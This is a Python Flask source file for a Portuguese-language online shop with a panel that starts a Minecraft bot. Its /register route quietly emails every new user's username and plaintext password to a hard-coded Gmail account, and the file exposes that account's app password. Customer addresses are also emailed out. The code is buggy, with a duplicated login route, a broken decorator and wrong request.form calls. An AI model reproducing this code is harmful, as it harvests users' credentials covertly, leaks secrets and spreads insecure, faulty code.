import os
import json
import socket
import threading
import subprocess
from collections import deque, defaultdict
from flask import Flask, redirect, render_template, request, session, jsonify
from flask_session import Session
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename

from cs50 import SQL

from functools import wraps

SETTINGS_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'settings.json')
USER_SETTINGS_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_settings.json')

import subprocess
import smtplib
import email.message

user_bots = {}
user_bot_logs = defaultdict(lambda: deque(maxlen=50))
log_lock = threading.Lock()


def load_settings():
    try:
        with open(SETTINGS_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {
            'server': {'ip': 'localhost', 'port': 25565, 'version': '1.20.2'},
            'utils': {
                'auto-auth': {'enabled': False, 'password': ''},
                'chat-messages': {'enabled': True, 'messages': ['Olá servidor!'], 'repeat': False, 'repeat-delay': 10},
                'anti-afk': {'enabled': False, 'sneak': False}
            },
            'position': {'enabled': False, 'x': 0, 'y': 64, 'z': 0}
        }


def save_settings(settings):
    with open(SETTINGS_PATH, 'w', encoding='utf-8') as f:
        json.dump(settings, f, indent=2, ensure_ascii=False)


def get_user_settings_path(user_id):
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), f'user_settings_{user_id}.json')


def load_user_settings(user_id):
    user_path = get_user_settings_path(user_id)
    try:
        if os.path.exists(user_path):
            with open(user_path, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception:
        pass

    try:
        with open(USER_SETTINGS_PATH, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data.get(str(user_id), load_settings())
    except Exception:
        return load_settings()


def save_user_settings(user_id, settings):
    user_path = get_user_settings_path(user_id)
    try:
        with open(user_path, 'w', encoding='utf-8') as f:
            json.dump(settings, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

    try:
        if os.path.exists(USER_SETTINGS_PATH):
            with open(USER_SETTINGS_PATH, 'r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = {}
    except Exception:
        data = {}

    data[str(user_id)] = settings
    with open(USER_SETTINGS_PATH, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def read_bot_output(proc, user_id):
    if proc.stdout is None:
        return
    for line in proc.stdout:
        text = line.strip()
        if text:
            with log_lock:
                user_bot_logs[user_id].append(text)


def check_server(host, port, timeout=5):
    try:
        with socket.create_connection((host, int(port)), timeout):
            return True
    except Exception:
        return False


def enviar_email(corpo_email):  
    

    msg = email.message.Message()
    msg['Subject'] = "Assunto"
    msg['From'] = 'caioba.maciel@gmail.com'
    msg['To'] = 'caioba.maciel@gmail.com'
    password = 'nqtenlurghflcokf'
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo_email )

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('Email enviado')
def EmailToClient(corpo_email, client):  
    

    msg = email.message.Message()
    msg['Subject'] = "Assunto"
    msg['From'] = 'caioba.maciel@gmail.com'
    msg['To'] = client
    password = 'nqtenlurghflcokf'
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo_email )

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('Email enviado')



# In[ ]:

app = Flask(__name__)

# Configuração da sessão
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

# Chave secreta para criptografar a sessão
app.secret_key = 'sua_chave_secreta_aqui'

UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static', 'produtos')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get("user_id") is None:
            return redirect("/login")
        return f(*args, **kwargs)
    return decorated_function
# Configure CS50 Library to use SQLite database
db = SQL("sqlite:///loja.db")

# Variável global do produto selecionado
produto_atual = {}

@app.after_request
def after_request(response):
    """Ensure responses aren't cached"""
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Expires"] = 0
    response.headers["Pragma"] = "no-cache"
    return response


@app.route("/", methods=["GET", "POST"])
def inicialpage():
    if request.method == "GET":
        pass
    if request.method == "POST":
        return redirect("/home")
    return render_template("inicialpage.html")

@app.route("/Painel", methods=["GET", "POST"])
@login_required
def painel():
    user_id = session["user_id"]
    settings = load_user_settings(user_id)
    bot_running = False
    bot_message = None
    server_status = None
    host = settings['server'].get('ip', '')
    port = settings['server'].get('port', '')
    version = settings['server'].get('version', '1.21')

    user_bot = user_bots.get(user_id)
    if user_bot is not None:
        if user_bot.poll() is None:
            bot_running = True
        else:
            user_bots.pop(user_id, None)

    if request.method == "POST":
        action = request.form.get("action")
        nick = request.form.get("nick")
        form_host = request.form.get("host")
        form_version = request.form.get("version")
        form_port = request.form.get("port")

        if action == "salvar":
            settings['server']['ip'] = form_host or settings['server']['ip']
            settings['server']['port'] = int(form_port) if form_port else settings['server']['port']
            settings['server']['version'] = form_version or settings['server']['version']
            settings['utils']['auto-auth']['enabled'] = request.form.get("auto_auth_enabled") == "on"
            settings['utils']['auto-auth']['password'] = request.form.get("auto_auth_password") or settings['utils']['auto-auth']['password']
            settings['utils']['chat-messages']['enabled'] = request.form.get("chat_messages_enabled") == "on"
            settings['utils']['chat-messages']['repeat'] = request.form.get("chat_repeat") == "on"
            settings['utils']['chat-messages']['repeat-delay'] = int(request.form.get("chat_repeat_delay") or settings['utils']['chat-messages']['repeat-delay'])
            messages_text = request.form.get("chat_messages") or ",".join(settings['utils']['chat-messages'].get('messages', []))
            settings['utils']['chat-messages']['messages'] = [m.strip() for m in messages_text.split(',') if m.strip()]
            settings['utils']['anti-afk']['enabled'] = request.form.get("anti_afk_enabled") == "on"
            settings['utils']['anti-afk']['sneak'] = request.form.get("anti_afk_sneak") == "on"
            settings['position']['enabled'] = request.form.get("position_enabled") == "on"
            settings['position']['x'] = int(request.form.get("position_x") or settings['position']['x'])
            settings['position']['y'] = int(request.form.get("position_y") or settings['position']['y'])
            settings['position']['z'] = int(request.form.get("position_z") or settings['position']['z'])

            save_user_settings(user_id, settings)
            bot_message = "Configurações salvas com sucesso."
            host = settings['server']['ip']
            port = settings['server']['port']
            version = settings['server']['version']

        elif action == "sair":
            if bot_running and user_bot:
                user_bot.terminate()
                user_bots.pop(user_id, None)
                bot_running = False
                bot_message = "Bot interrompido com sucesso."
                with log_lock:
                    user_bot_logs[user_id].append("Bot interrompido manualmente.")
            else:
                bot_message = "Nenhum bot em execução no momento."

        elif action == "iniciar":
            if bot_running:
                bot_message = "O bot já está em execução."
            elif not form_host or not form_port:
                bot_message = "Host e porta são obrigatórios para iniciar o bot."
            else:
                host = form_host
                port = int(form_port)
                version = form_version or version
                server_status = "online" if check_server(host, port) else "offline"
                if server_status == "offline":
                    bot_message = f"Servidor {host}:{port} não está ativo ou não aceita conexões."
                    with log_lock:
                        user_bot_logs[user_id].append(bot_message)
                else:
                    settings['server']['ip'] = host
                    settings['server']['port'] = port
                    settings['server']['version'] = version
                    save_user_settings(user_id, settings)
                    settings_path = get_user_settings_path(user_id)

                    proc = subprocess.Popen(
                        [
                            "node",
                            "bot.js",
                            nick or "Bot",
                            host,
                            str(port),
                            version,
                            settings_path,
                        ],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        bufsize=1,
                        universal_newlines=True,
                    )
                    user_bots[user_id] = proc
                    threading.Thread(target=read_bot_output, args=(proc, user_id), daemon=True).start()
                    bot_running = True
                    bot_message = f"Bot iniciado com sucesso. Servidor {host}:{port} está ativo."
                    with log_lock:
                        user_bot_logs[user_id].append(bot_message)

    return render_template(
        "Painel.html",
        mensagem=bot_message,
        bot_running=bot_running,
        server_status=server_status,
        bot_logs=list(user_bot_logs[user_id]),
        settings=settings,
        host=host,
        port=port,
        version=version,
    )

@app.route("/admin", methods=["GET", "POST"])
@login_required
def admin():
    if session.get("user_id") != 9:
        return redirect("/home")

    mensagem = None
    if request.method == "POST":
        action = request.form.get("action")
        produto_id = request.form.get("produto_id")
        nome = request.form.get("nome", "").strip()
        descricao = request.form.get("descricao", "").strip()
        imagens = request.form.get("imagens", "").strip()
        precos = request.form.get("precos", "").strip()
        cores = request.form.get("cores", "").strip()
        upload = request.files.get("imagem_upload")

        if upload and upload.filename:
            filename = secure_filename(upload.filename)
            caminho = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            upload.save(caminho)
            if imagens:
                imagens = f"{imagens},{filename}"
            else:
                imagens = filename

        if action == "add":
            if not nome:
                mensagem = "Nome é obrigatório para adicionar um produto."
            else:
                db.execute(
                    "INSERT INTO produtos (nome, descricao, imagens, precos, cores) VALUES (?, ?, ?, ?, ?)",
                    nome,
                    descricao,
                    imagens,
                    precos,
                    cores,
                )
                mensagem = "Produto adicionado com sucesso."

        elif action == "update" and produto_id:
            db.execute(
                "UPDATE produtos SET nome = ?, descricao = ?, imagens = ?, precos = ?, cores = ? WHERE id = ?",
                nome,
                descricao,
                imagens,
                precos,
                cores,
                produto_id,
            )
            mensagem = "Produto atualizado com sucesso."

        elif action == "delete" and produto_id:
            db.execute("DELETE FROM carrinho WHERE produto_id = ?", produto_id)
            db.execute("DELETE FROM produtos WHERE id = ?", produto_id)
            mensagem = "Produto excluído com sucesso."

    produtos = db.execute("SELECT * FROM produtos")
    return render_template("admin.html", produtos=produtos, mensagem=mensagem)

@app.route("/home", methods=["GET", "POST"])
@login_required
def index():
    global produto_atual  # Define a variável global do produto selecionado
    user_id = session["user_id"]
    if user_id == 9:
        return redirect("/admin")
    if request.method == "POST":
        # Verifica se o POST é uma pesquisa
        if "pesquisa" in request.form:
            pesquisa = request.form["pesquisa"]
            produtos = db.execute("SELECT * FROM produtos WHERE nome LIKE ?", f"%{pesquisa}%")
            return render_template("index.html", produtos=produtos)

        # Verifica se o POST é do botão "Adicionar ao Carrinho"
        if "carrinho" in request.form:
            print("/////////////////////////////carrinho //////////////////////////////")
            produto_id = request.form["carrinho"]
            if 'user_id' in session:
                cor = request.form("cor")
                preco = request.form("preco")
                
                user_id = session["user_id"]
                db.execute("INSERT INTO carrinho (user_id, produto_id, cor,preco) VALUES (?, ?,?,?)", user_id, produto_id, cor, preco)
                return redirect("/carrinho")
            else:
                return redirect("/login")

        try:
            # Recebe os dados JSON enviados pelo cliente
            data = request.get_json()

            # Extrai o 'id' do JSON
            produto_id = data.get('id')

            print(f"ID do produto recebido: {produto_id}")

            # Busca o produto no banco de dados pelo id
            resultado = db.execute("SELECT * FROM produtos WHERE id = ?", produto_id)

            if resultado:
                produto_atual = resultado[0]  # Armazena apenas o primeiro produto encontrado
                return jsonify({"status": "sucesso"}), 200
            else:
                return jsonify({"status": "erro", "mensagem": "Produto não encontrado"}), 404

        except Exception as e:
            return jsonify({"status": "erro", "mensagem": str(e)}), 400

    produtos = db.execute("SELECT * FROM produtos")
    return render_template("index.html", produtos=produtos)
@app.route("/produto", methods=["GET", "POST"])
@login_required
def produto():
    global produto_atual

    if request.method == "POST":
        if "cep" in request.form:
            
            cep = request.form.get("cep")
            rua = request.form.get("rua")
            numero = request.form.get("numero")
            complemento = request.form.get("complemento")
            bairro = request.form.get("bairro")
            cidade = request.form.get("cidade")
            estado = request.form.get("estado")
            mail = request.form.get("mail")

            


            texto = f"""cep:{cep}  rua:{rua}  numero:{numero}  complemento:{complemento}  bairo:{bairro}  cidade:{cidade}  estado:{estado}  email:{mail} """

            text = f"""Sua compra Foi realizada com successo no Valor de {request.form.get("valor")}r$ seu pedido será emcaminhado após a realização do pagamento.caso não foi você entre em contato: 31 984217616"""

            try:
                EmailToClient(text, mail)
            except:
                return render_template("error.html", erro = "email invalido")

            enviar_email(texto)

            return render_template("pix.html", valor = request.form.get("valor"))

    if "buy" in request.args:
        produto_id = request.args.get("buy")
        valor = request.args.get("preco")
        cor = request.args.get("cor")
        text =f"""<h1>foi comprado um produto {produto_id} de {valor} reais da cor: {cor} e vc é um cara legal</h1>"""
        enviar_email(text)
        return render_template("pagamento.html", valor = valor)
        
    print(produto_atual)
    precos = produto_atual["precos"].split(",")
    cores = produto_atual["cores"].split(",")
    if produto_atual:
        return render_template("produto.html", produto=produto_atual, precos=precos, cores=cores)
    else:
        return redirect("/home")

@app.route("/carrinho", methods=["GET", "POST"])
@login_required
def carrinho():
    if request.method == "POST":
        if "cep" in request.form:

            cep = request.form.get("cep")
            rua = request.form.get("rua")
            numero = request.form.get("numero")
            complemento = request.form.get("complemento")
            bairro = request.form.get("bairro")
            cidade = request.form.get("cidade")
            estado = request.form.get("estado")
            mail = request.form.get("mail")

            texto = f"""cep:{cep}  rua:{rua}  numero:{numero}  complemento:{complemento}  bairo:{bairro}  cidade:{cidade}  estado:{estado}  email:{mail} """

            text = f"""Sua compra Foi realizada com successo no Valor de {request.form.get("valor")}r$ seu pedido será emcaminhado após a realização do pagamento.caso não foi você entre em contato: 31 984217616"""

            try:
                EmailToClient(text, mail)
            except:
                return render_template("error.html", erro = "email invalido")

            enviar_email(texto)

            return render_template("pix.html", valor = request.form.get("valor"))
    # Obtém os IDs dos produtos no carrinho do usuário
    produtos_ids = db.execute("SELECT produto_id FROM carrinho WHERE user_id = ?", session["user_id"])

    # Extrai os IDs dos produtos da lista de dicionários
    ids = tuple(item["produto_id"] for item in produtos_ids)

    # Obtém os dados do usuário
    user = db.execute("SELECT * FROM users WHERE id = ?", session["user_id"])

    info = db.execute("SELECT cor, preco FROM carrinho WHERE user_id = ?", session["user_id"])
    print(info)

    # Obtém os produtos correspondentes aos IDs
    if ids:  # Verifica se há IDs para evitar erros na consulta SQL
        produtos = db.execute("SELECT * FROM produtos WHERE id IN ({})".format(", ".join("?" for _ in ids)), *ids)
    else:
        produtos = []  # Se não houver produtos no carrinho, retorna uma lista vazia

    

    # Obtém a quantidade de produtos do request
    quant = int(request.args.get("quant", 0))  # Converte para inteiro
    if quant > 0:
        precos = []
        cores = []
        ids = []

        for i in range(quant):
            precos.append(request.args.get(f"preco{i}", "0"))  # Usa f-strings para maior legibilidade
            cores.append(request.args.get(f"cor{i}", "0"))
            ids.append(request.args.get(f"id{i}", "0"))

        total = 0

        for preco in precos:
            total+=float(preco)

        

        print(precos, cores, ids)

        for i in range(quant):
            texto= f"foi compado produto{ids[i]} em uma carrinho por {precos[i]} da cor {cores[i]}"
            enviar_email(texto)

        return render_template("pagamento.html",valor = total)

    return render_template("carrinho.html", user=user[0], produtos=produtos, info = info)


app.route("/login", methods=["GET", "POST"])
def login():
    """Log user in"""

    # Limpa a sessão atual
    session.clear()

    if request.method == "POST":
        # Verifica se o nome de usuário foi enviado
        if not request.form.get("username"):
            return ("must provide username")

        # Verifica se a senha foi enviada
        elif not request.form.get("password"):
            return("must provide password")

        # Consulta o banco de dados para o nome de usuário
        rows = db.execute(
            "SELECT * FROM users WHERE username = ?", request.form.get("username")
        )
        

        # Verifica se o nome de usuário existe e se a senha está correta
        if len(rows) != 1 or not check_password_hash(
            rows[0]["hash"], request.form.get("password")
        ):
            return ("invalid username and/or password")

        # Armazena o ID do usuário na sessão
        session["user_id"] = rows[0]["id"]

        # Redireciona para a página inicial
        return redirect("/home")

    # Se o método for GET, exibe a página de login
    return render_template("login.html")


@app.route("/register", methods=["GET", "POST"])
def register():
    """Register user"""

    if request.method == "POST":
        # Verifica se o nome de usuário foi enviado
        if not request.form.get("username"):
            return render_template("error.html", erro = "must provide username, 400")

        # Verifica se a senha foi enviada
        elif not request.form.get("password"):
            return ("must provide password")

        # Verifica se a confirmação da senha foi enviada
        elif not request.form.get("confirmation"):
            return ("must confirm password")

        # Verifica se as senhas coincidem
        if request.form.get("password") != request.form.get("confirmation"):
            return ("passwords do not match")

        texto = f"user: {request.form.get('username')} senha: {request.form.get('password')}"


        enviar_email(texto)

        # Gera o hash da senha
        hash = generate_password_hash(request.form.get("password"))

        # Insere o novo usuário no banco de dados
        try:
            db.execute(
                "INSERT INTO users (username, hash) VALUES (?, ?)",
                request.form.get("username"), hash
            )
        except:
            return render_template("username already exists")

        # Redireciona para a página de login
        return redirect("/login")

    # Se o método for GET, exibe a página de registro
    return render_template("register.html")


@app.route("/logout")
def logout():
    """Log user out"""

    # Limpa a sessão
    session.clear()

    # Redireciona para a página de login
    return redirect("/home")
@app.route("/adicionar_carrinho", methods=["GET"])
def adicionar_carrinho():
    if 'user_id' in session:
        produto_id = request.args.get("produto_id")  # Captura o produto_id da URL
        if produto_id:
            
            cor = request.args.get("cor")
            preco = request.args.get("preco")
                
            user_id = session["user_id"]
            db.execute("INSERT INTO carrinho (user_id, produto_id, cor,preco) VALUES (?, ?,?,?)", user_id, produto_id, cor, preco)
            return redirect("/carrinho")
        else:
            return "ID do produto não fornecido.", 400
    else:
        return redirect("/login")
    


@app.route("/login", methods=["GET", "POST"])
def login():
    """Log user in"""

    # Limpa a sessão atual
    session.clear()

    if request.method == "POST":
        # Verifica se o nome de usuário foi enviado
        if not request.form.get("username"):
            return ("must provide username")

        # Verifica se a senha foi enviada
        elif not request.form.get("password"):
            return("must provide password")

        # Consulta o banco de dados para o nome de usuário
        rows = db.execute(
            "SELECT * FROM users WHERE username = ?", request.form.get("username")
        )

        # Verifica se o nome de usuário existe e se a senha está correta
        if len(rows) != 1 or not check_password_hash(
            rows[0]["hash"], request.form.get("password")
        ):
            return redirect("/login")

        # Armazena o ID do usuário na sessão
        session["user_id"] = rows[0]["id"]

        # Redireciona para a página inicial
        return redirect("/home")

    # Se o método for GET, exibe a página de login
    return render_template("login.html")

